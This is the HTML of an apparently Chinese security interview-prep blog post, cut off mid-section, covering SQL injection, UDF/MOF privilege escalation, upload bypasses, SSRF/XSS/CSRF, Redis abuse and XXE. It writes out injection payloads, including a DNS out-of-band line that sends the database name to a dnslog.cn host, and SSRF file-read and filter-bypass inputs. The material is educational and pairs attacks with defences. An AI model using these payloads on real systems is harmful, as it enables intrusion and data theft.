toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">2.33.</span> <span class="toc-text"> 二次反序列化有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat%E4%B8%ADjsp%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.34.</span> <span class="toc-text"> Tomcat中JSP的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.35.</span> <span class="toc-text"> java内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E4%BB%A3%E5%AE%A1"><span class="toc-number">2.36.</span> <span class="toc-text"> java代审</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf"><span class="toc-number">2.37.</span> <span class="toc-text"> java反序列化绕WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%BB%95%E8%BF%87templatesimpl"><span class="toc-number">2.38.</span> <span class="toc-text"> 高版本下绕过templatesImpl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text"> 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text"> 渗透测试思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.2.</span> <span class="toc-text"> 信息收集步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text"> 常见端口服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-cdncdn-%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.4.</span> <span class="toc-text"> 什么是 CDN？CDN 的作用是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-cdn"><span class="toc-number">3.5.</span> <span class="toc-text"> 如何判断目标是否存在 CDN？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-cdn-%E6%89%BE%E7%9C%9F%E5%AE%9E-ip-%E5%9C%B0%E5%9D%80"><span class="toc-number">3.6.</span> <span class="toc-text"> 如何绕过 CDN 找真实 IP 地址？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%8B%E5%B7%A5%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E7%AB%99%E6%98%AF-windows-%E8%BF%98%E6%98%AF-linux-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">3.7.</span> <span class="toc-text"> 如何手工快速判断目标站是 Windows 还是 Linux 服务器？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E5%92%8C%E5%86%B0%E8%9D%8E%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.8.</span> <span class="toc-text"> 蚁剑和冰蝎的区别?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">4.</span> <span class="toc-text"> 内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E4%B8%AD-getsystem-%E6%97%A0%E6%B3%95%E6%8F%90%E6%9D%83%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">4.1.</span> <span class="toc-text"> MSF 中 Getsystem 无法提权怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E4%B8%AD%E8%B7%AF%E7%94%B1%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.2.</span> <span class="toc-text"> MSF 中路由的作用是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%85%B6%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.3.</span> <span class="toc-text"> 什么是 “哈希传递攻击”？其原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%92%8C-linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.4.</span> <span class="toc-text"> Windows 和 Linux 系统中常见的持久化控制方法有哪些？（权限维持）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms17-010%E6%98%AF%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.5.</span> <span class="toc-text"> ms17-010是什么漏洞？用了什么协议？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BA%86%E8%A7%A3%E5%90%97%E5%8F%AF%E4%BB%A5%E8%AE%B2%E4%B8%8B%E5%90%97"><span class="toc-number">4.6.</span> <span class="toc-text"> 黄金票据和白银票据了解吗，可以讲下吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E8%AE%B2%E4%B8%8B%E5%88%A9%E7%94%A8%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6%E5%90%97"><span class="toc-number">4.7.</span> <span class="toc-text"> 可以讲下利用黄金票据前提条件吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%9C%89%E5%93%AA%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="toc-number">4.8.</span> <span class="toc-text"> 内网横向有哪些思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF"><span class="toc-number">4.9.</span> <span class="toc-text"> Windows提权技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF"><span class="toc-number">4.10.</span> <span class="toc-text"> Linux提权技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7"><span class="toc-number">4.11.</span> <span class="toc-text"> 内网信息收集工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E9%98%9F"><span class="toc-number">5.</span> <span class="toc-text"> 蓝队</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text"> 应急响应基本思路</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-面经" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/01/06/%E9%9D%A2%E7%BB%8F/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-01-06T15:36:03.000Z" itemprop="datePublished">2026-01-06</time>
+    <time style="display: none;" id="post-update-time">2026-03-04</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%A2%E7%BB%8F/" data-aos="zoom-in">面经</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="sql注入原理"><a class="markdownIt-Anchor" href="#sql注入原理"></a> SQL注入原理</h3>
+<p>未对用户的输入进行检验过滤，未进行预编译，或者处理的不完整，处理程序不完善，导致可以将恶意代码插入数据库查询语句中，造成SQL注入</p>
+<p><strong>联合注入</strong>：通过union select将额外的查询条件注入到原始的查询语句中，从而获取数据库中的信息</p>
+<p>**布尔盲注：**由于页面无结果回显，只能依据页面回显变化（例如页面内容、状态码或响应时间）利用布尔条件（真/假）来逐位或逐字符猜解数据</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>**时间盲注：**适用于页面无任何回显变化，利用sleep函数，制造时间延迟，由回显时间来判断SQL语句是否成立，进而逐位或逐字符猜解数据</p>
+<p>**报错注入：**当我们向数据库发送查询语句时，如果查询语句存在语法错误，数据库通常会返回相应的错误信息。报错注入就是构造这些错误的查询语句，使得数据库在处理时不仅返回错误，还能将我们想要的数据一同展示在错误信息中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br><span class="line">floor()</span><br></pre></td></tr></table></figure>
+<p>**宽字节注入：**利用多字节字符集（如 GBK / BIG5）中“一个汉字 = 两个字节”的特性，通过<code>%df</code>与转义字符 <code>\</code> (%5c)结合让转义字符失效，从而逃逸出引号</p>
+<p>**二次注入：**将可能导致SQL注入的字符先存入到数据库中，而当我们再次调用这个恶意构造的字符时就可以触发SQL注入</p>
+<p>**DNS外带注入：**通过构造特殊 SQL 语句，让数据库在执行时主动发起 DNS 查询，查询的域名中包含我们需要获取的数据（如数据库名、用户名等）。之后，通过查看 DNS 服务器的解析日志，即可从域名中提取目标数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用到的函数： load_file database() concat() ascii()</span><br><span class="line">1&#x27; union select 1,load_file(concat(&#x27;\&#x27;,(select database()),&#x27;.9hg8iv.dnslog.cn\\abc&#x27;))#</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260107125126085.png" alt="image-20260107125126085" /></p>
+<p>**写文件：**前提：知道网站绝对路径，有写入权限，load_file开启（即<code>secure_file_priv</code>无限制）。通过 <code>INTO OUTFILE</code> 或 <code>INTO DUMPFILE</code> 函数，攻击者可写入恶意文件（如Webshell），实现持久化控制</p>
+<p>**常见绕过：**大小写，SQL不区分大小写，双写绕过，URL编码绕过，内联注释绕过，十六进制绕过，chr ASCII码绕过 Unicode绕过</p>
+<p>**防御：**使⽤参数化查询和预编译的查询，对⽤户的输⼊进⾏严格的验证和清理</p>
+<p>黑名单：对特殊的字符例如括号斜杠进行转义过滤删除；白名单：对用户的输入进行正则表达式匹配限制</p>
+<h3 id="udf提权原理"><a class="markdownIt-Anchor" href="#udf提权原理"></a> UDF提权原理</h3>
+<p>一句话：</p>
+<blockquote>
+<ul>
+<li>原理：UDF(user defined function)用户自定义函数通过添加新函数，对mysql服务器进行功能扩充，将mysql账号转化为system权限</li>
+<li>方式：通过root权限导出udf.dll到系统目录下，使udf.dll调用cmd</li>
+</ul>
+</blockquote>
+<p><code>UDF(user-defined function)</code>是 MySQL 的⼀个拓展接⼝，也可称之为<strong>⽤户⾃定义函数</strong></p>
+<p>⽤户可以通过⾃⼰增加函数对 mysql 功能进⾏扩充，⽂件后缀为<code> .dll</code></p>
+<p>原理： 利⽤ root 权限，创建带有调⽤ cmd 函数的 <code>’udf.dll’( 动态链接库 ) </code></p>
+<p>当我们把<code> ’udf.dll’</code> 导出指定⽂件夹引⼊ Mysql 时，其中的调⽤函数拿出来当作 mysql 的函数使⽤。</p>
+<p>这样我们⾃定义的函数才被当作本机函数执⾏</p>
+<p>在使⽤<code>CREAT FUNCITON</code>调⽤ <code>dll </code>中的函数后，<code>mysql</code>账号转化为 <code>system</code> 权限，从⽽提权</p>
+<h3 id="mof提权"><a class="markdownIt-Anchor" href="#mof提权"></a> MOF提权</h3>
+<ul>
+<li>原理：</li>
+</ul>
+<p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的<strong>nullevt.mof</strong>文件。该文件每几秒会<strong>执行</strong>一次，向其中写入<strong>cmd命令</strong>使其被执行</p>
+<ul>
+<li>利用条件</li>
+</ul>
+<ol>
+<li><code>windows&lt;= 2003</code></li>
+<li>对<code>c:/windows/system32/wbem/mof/</code>目录有读写权限</li>
+<li>可以时间写mof文件到相应目录，如：数据库允许外联，有webshell，有可写sql注入</li>
+</ol>
+<h3 id="mysql写shell如果不知道网站绝对路径我们通过什么方式可以知道网站路-径"><a class="markdownIt-Anchor" href="#mysql写shell如果不知道网站绝对路径我们通过什么方式可以知道网站路-径"></a> mysql写shell，如果不知道⽹站绝对路径，我们通过什么⽅式可以知道⽹站路 径</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感⽂件泄露，例如phpinfo</span><br><span class="line">通过⻚⾯报错</span><br><span class="line">通过mysql load_file读取配置⽂件获取</span><br><span class="line">phpmyadmin</span><br><span class="line">nginx⽂件类型错误解析爆出路径</span><br><span class="line">如果eval函数可控，可以传⼊phpinfo()来获取</span><br></pre></td></tr></table></figure>
+<h3 id="sql注入判断数据库类型的语句是什么"><a class="markdownIt-Anchor" href="#sql注入判断数据库类型的语句是什么"></a> SQL注⼊判断数据库类型的语句是什么？</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span> (mssql)</span><br><span class="line">;<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> msysobjects)<span class="operator">&gt;</span><span class="number">0</span> (access)</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> (mysql)</span><br></pre></td></tr></table></figure>
+<h3 id="mysql-的网站注入50-以上和-50-以下有什么区别"><a class="markdownIt-Anchor" href="#mysql-的网站注入50-以上和-50-以下有什么区别"></a> MySQL 的网站注入，5.0 以上和 5.0 以下有什么区别？</h3>
+<p>MySQL 5.0 以上与以下版本的注入差异主要体现在<strong>系统数据库</strong>和<strong>功能支持</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>MySQL 5.0 以下</th>
+<th>MySQL 5.0 以上</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>系统数据库</td>
+<td>无<code>information_schema</code>库</td>
+<td>有<code>information_schema</code>库（存储所有表 / 字段信息）</td>
+</tr>
+<tr>
+<td>注入信息获取方式</td>
+<td>需暴力猜解表名 / 字段名（如<code>users</code>、<code>admin</code>）</td>
+<td>可通过<code>information_schema.tables</code>直接查询（如<code>select table_name from information_schema.tables</code>）</td>
+</tr>
+<tr>
+<td>子查询支持</td>
+<td>部分版本不支持复杂子查询</td>
+<td>支持子查询（如<code>select (select username from users limit 1)</code>）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sql-注入过滤了逗号怎么处理"><a class="markdownIt-Anchor" href="#sql-注入过滤了逗号怎么处理"></a> SQL 注入过滤了逗号，怎么处理？</h3>
+<p>逗号（<code>，</code>）常用于分隔参数（如<code>substr(a,1,1)</code>、<code>limit 1,2</code>），过滤后可通过以下方式替代：</p>
+<ul>
+<li><strong><code>substr()</code> 用 <code>substring()</code> + <code>from for</code></strong>： <code>substr(username,1,1)</code> → <code>substring(username from 1 for 1)</code></li>
+<li><strong><code>limit m,n</code> 用 <code>limit n offset m</code></strong>： <code>limit 1,2</code> → <code>limit 2 offset 1</code></li>
+<li><strong><code>union select 1,2,3</code> 用 <code>union select 1/\*!\*/2/\*!\*/3</code></strong>（利用注释<code>/\*!\*/</code>分隔）</li>
+<li><strong>函数参数用括号嵌套</strong>： <code>concat(1,2)</code> → <code>concat(1/*!*/,2)</code>（通过注释绕过逗号检测）</li>
+</ul>
+<h3 id="sql-注入存在时怎么判断是什么数据库"><a class="markdownIt-Anchor" href="#sql-注入存在时怎么判断是什么数据库"></a> SQL 注入存在时，怎么判断是什么数据库？</h3>
+<p>通过以下特征区分数据库类型：</p>
+<table>
+<thead>
+<tr>
+<th>特征</th>
+<th>MySQL</th>
+<th>SQL Server</th>
+<th>Oracle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>错误信息</td>
+<td>含 “MySQL syntax error”</td>
+<td>含 “SQL Server error”</td>
+<td>含 “ORA-xxxx”</td>
+</tr>
+<tr>
+<td>特有的系统表</td>
+<td><code>information_schema.tables</code></td>
+<td><code>sysobjects</code></td>
+<td><code>user_tables</code></td>
+</tr>
+<tr>
+<td>特有的函数</td>
+<td><code>version()</code></td>
+<td><code>@@version</code></td>
+<td><code>banner</code>（需<code>sys.v_$version</code>）</td>
+</tr>
+<tr>
+<td>注释符</td>
+<td><code>-- </code>、<code>#</code></td>
+<td><code>--</code>、<code>/* */</code></td>
+<td><code>--</code>、<code>/* */</code></td>
+</tr>
+<tr>
+<td>测试语句</td>
+<td><code>select 1 from dual</code>（不支持 dual，用<code>select 1</code>）</td>
+<td><code>select 1</code></td>
+<td><code>select 1 from dual</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="文件上传原理绕过"><a class="markdownIt-Anchor" href="#文件上传原理绕过"></a> 文件上传原理/绕过</h3>
+<p><strong>应用未能对用户可控文件的「类型、内容、存储位置、访问方式」进行完整可信校验，导致攻击者上传并触发恶意文件执行。</strong></p>
+<p>白名单绕过：禁用前端js校验，修改Content-Type绕过，抓包修改文件后缀绕过</p>
+<p>黑名单绕过：.htaccess文件绕过(Apache),.user.ini文件绕过(nginx)，大小写绕过，后缀名绕过，双写绕过(替换为空时)</p>
+<p>如果是 windows ，那么可以在⽂件后缀后⾯添加加<code> . \ _ ::$DATA</code>，还可以使⽤不符合 windows ⽂件命名规则的⽂件 名， Windows 可以⾃⼰去除</p>
+<p>如果是 Linux ，使⽤ %00 截断</p>
+<h4 id="htaccess"><a class="markdownIt-Anchor" href="#htaccess"></a> .htaccess</h4>
+<p><code>Apache</code></p>
+<p>通过 <code>.htaccess</code> 文件修改当前目录服务器配置，将非常规扩展名解析为可执行脚本（如 PHP），绕过文件上传黑名单限制。</p>
+<p><code>SetHandler application/x-httpd-php</code><br />
+此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析（上传jpg文件但内容为一句话木马，也会被成功解析）</p>
+<h4 id="userini"><a class="markdownIt-Anchor" href="#userini"></a> .user.ini</h4>
+<p>.user.ini文件中的<code>auto_append_file</code>和<code>auto_prepend_file</code>两个配置项指定的文件都会被当前目录的可执行的PHP文件所包含，类似与在执行当前目录的PHP文件前或后使用require()函数，包含配置项指定的文件</p>
+<h3 id="ssrf和csrf和xss的原理和区别"><a class="markdownIt-Anchor" href="#ssrf和csrf和xss的原理和区别"></a> ssrf和csrf和xss的原理和区别</h3>
+<p>相同点：XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p>
+<p>ssrf：攻击者通过操纵服务器，使其向攻击者指定的目标发送请求。</p>
+<p>csrf：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作</p>
+<p>xss：攻击者向Web页面或URL中注入恶意JavaScript代码。若应用未对用户输入进行有效过滤，正常用户访问页面时，恶意脚本会被浏览器执行，从而实现攻击目的</p>
+<p><strong>SSRF</strong>：攻击者控制<strong>服务器去请求哪里</strong><br />
+<strong>CSRF</strong>：攻击者利用<strong>用户的登录态替用户发请求</strong><br />
+<strong>XSS</strong>：攻击者控制<strong>用户浏览器里执行的脚本</strong></p>
+<h3 id="ssrf和csrf和xss的防御方法"><a class="markdownIt-Anchor" href="#ssrf和csrf和xss的防御方法"></a> ssrf和csrf和xss的防御方法</h3>
+<p>XSS：对字符实体进⾏转义、使⽤ HTTP Only  来禁⽌ JavaScript  读取 Cookie  值、输 ⼊时校验、浏览器与 Web  应⽤端采⽤相同的字符编码</p>
+<p>CSRF：：筛选出需要防范 CSRF  的⻚⾯然后嵌⼊ Token 、再次输⼊密码、检验 Referer</p>
+<p>SSRF:</p>
+<p>1,过滤返回信息</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>
+<h3 id="ssrf的利用"><a class="markdownIt-Anchor" href="#ssrf的利用"></a> ssrf的利用</h3>
+<ul>
+<li>第一步：验证漏洞存在（如请求<code>http://127.0.0.1</code>看响应，或用<code>file:///etc/passwd</code>测试文件读取）；</li>
+<li>第二步：探测内网范围（扫描<code>192.168.0.0/24</code>、<code>10.0.0.0/8</code>等网段，通过响应时间判断存活 IP 和开放端口）；</li>
+<li>第三步：识别内网服务（访问常见端口如 8080、3306、6379，结合响应内容判断服务类型，如 Tomcat、MySQL、Redis）；</li>
+<li>第四步：针对性攻击（如利用 Redis 未授权写公钥、Weblogic 反序列化漏洞执行命令）；</li>
+<li>第五步：扩大影响（读取内网凭证、横向移动攻击其他主机）</li>
+</ul>
+<h3 id="ssrf一般常用的伪协议有哪些"><a class="markdownIt-Anchor" href="#ssrf一般常用的伪协议有哪些"></a> ssrf⼀般常⽤的伪协议有哪些？</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher file dict sftp ldap</span><br></pre></td></tr></table></figure>
+<h3 id="ssrf-禁用-127001-后如何绕过支持哪些协议"><a class="markdownIt-Anchor" href="#ssrf-禁用-127001-后如何绕过支持哪些协议"></a> SSRF 禁⽤ 127.0.0.1 后如何绕过，⽀持哪些协议？</h3>
+<p>将 ip 转为<code>8/10/16</code>进制绕过</p>
+<p><code> xip.io</code> 和<code> xip.name</code> 绕过</p>
+<p>封闭式字⺟数字（圆圈编码）绕过，例如<code>ⓔⓧⓐⓜⓟ</code></p>
+<p>将 ip 的点换成句号绕过</p>
+<p>添加 @ 符号绕过</p>
+<p>特殊 0 绕过， Windows 下 0 代表 <code>0.0.0.0</code> ， Linux 下 0 代表<code> 127.0.0.1</code>  <code>http://0/flag.php </code></p>
+<p>访问 <a target="_blank" rel="noopener" href="http://sudu.cc">sudu.cc</a> 就是<code>127.0.0.1</code></p>
+<p>省略 0 ，如 <code>127.1 </code></p>
+<p>DNS 重绑定，，在第⼀次校验 IP 的时候返回⼀个合法的 IP ，在真实发起请求的时候，将域名绑定的 ip 改为内⽹ ip ，因为有过第⼀次的请求，服务器会信任该域名，殊不知域名对应的 ip 已经被改为内⽹ 了。</p>
+<h3 id="csrf-漏洞如何防护"><a class="markdownIt-Anchor" href="#csrf-漏洞如何防护"></a> CSRF 漏洞如何防护</h3>
+<p>验证请求来源：在服务器端对请求进行校验，只接受来自信任的源的请求，如 Referer 校验、CSRF Token 校验等；</p>
+<h3 id="redis未授权利用redis提权利用方式"><a class="markdownIt-Anchor" href="#redis未授权利用redis提权利用方式"></a> Redis未授权利用/redis提权利用方式</h3>
+<p>利用redis写入webshell<br />
+通过写入SSH公钥实现SSH登录<br />
+写入计划任务,反弹shell<br />
+主从复制写入恶意的c代码</p>
+<h3 id="redis未授权的防护"><a class="markdownIt-Anchor" href="#redis未授权的防护"></a> Redis未授权的防护</h3>
+<p>设置强密码</p>
+<p>低权限运⾏</p>
+<p>不对外⽹开放</p>
+<p>禁⽌运⾏⼀些⾼危命令</p>
+<h3 id="redis主从复制原理"><a class="markdownIt-Anchor" href="#redis主从复制原理"></a> Redis主从复制原理</h3>
+<p>Redis 默认信任 Master，同步数据时不校验来源，导致攻击者伪装 Master 向 Slave 注入任意数据，从而实现文件写入或代码执行</p>
+<h3 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h3>
+<p><strong>1. 反射型XSS：反射型XSS攻击是一次性的攻击，当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行</strong></p>
+<p><strong>2. 存储型XSS：主要是将恶意代码存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码</strong></p>
+<p><strong>3. DOM型：客户端的脚本程序可以动态地检查和修改页面内容，不与服务端进行交互</strong></p>
+<h3 id="xxe漏洞"><a class="markdownIt-Anchor" href="#xxe漏洞"></a> XXE漏洞</h3>
+<p>XXE（XML External Entity Injection，XML 外部实体注入）漏洞是指当应用程序<strong>解析不可信的 XML 输入时，未正确限制外部实体的引用</strong>，导致攻击者可通过构造恶意 XML 文档，读取本地文件、探测内网、执行远程代码（部分场景）等。</p>
+<p>其核心是<strong>滥用 XML 外部实体</strong>：攻击者在 XML 的 DTD 中定义外部实体，引用本地文件或远程资源，XML 解析器会执行该引用，导致信息泄露或其他危害。</p>
+<hr />
+<p>XXE 漏洞的原理基于 XML 解析器对外部实体的处理机制：</p>
+<ol>
+<li>应用程序接收并解析用户提交的 XML 数据（如 API 接口、文件上传等场景）。</li>
+<li>攻击者构造的 XML 文档中包含恶意 DTD，定义了引用外部资源（如本地文件、远程服务器）的外部实体。</li>
+<li>若 XML 解析器<strong>未禁用外部实体功能</strong>（默认配置可能允许），会解析该外部实体，读取引用的资源内容或向远程服务器发送请求。</li>
+<li>解析结果可能通过应用程序响应回显给攻击者（有回显），或需通过外带方式获取（无回显）。</li>
+</ol>
+<hr />
+<p>绕过：若应用程序过滤了 <code>SYSTEM</code> 和 <code>PUBLIC</code> 关键字，可通过以下方式绕过：</p>
+<ul>
+<li>
